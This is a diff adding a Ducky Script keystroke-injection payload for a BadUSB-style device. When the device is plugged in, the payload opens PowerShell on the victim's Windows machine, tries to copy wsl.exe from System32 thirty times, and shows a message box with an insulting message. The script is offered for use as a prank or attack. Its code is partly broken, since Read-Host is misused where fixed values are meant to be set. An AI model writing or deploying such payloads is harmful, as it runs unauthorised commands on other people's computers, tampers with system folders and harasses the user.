@@ -1,0 +1,24 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+STRING $fileToDuplicate = Read-Host C:\Windows\System32\wsl.exe
+ENTER
+STRING $numCopies = Read-Host 30
+ENTER
+STRING for ($i = 0; $i -lt $numCopies; $i++) {
+ENTER
+STRING $newFileName = "$fileToDuplicate-$i"
+ENTER
+STRING Copy-Item $fileToDuplicate $newFileName
+ENTER
+STRING }
+ENTER
+STRING $msgBoxTitle = "I tu callat"
+ENTER
+STRING $msgBoxMessage = "Hola Putita"
+ENTER
+STRING [System.Windows.Forms.MessageBox]::Show($msgBoxMessage, $msgBoxTitle)
+ENTER
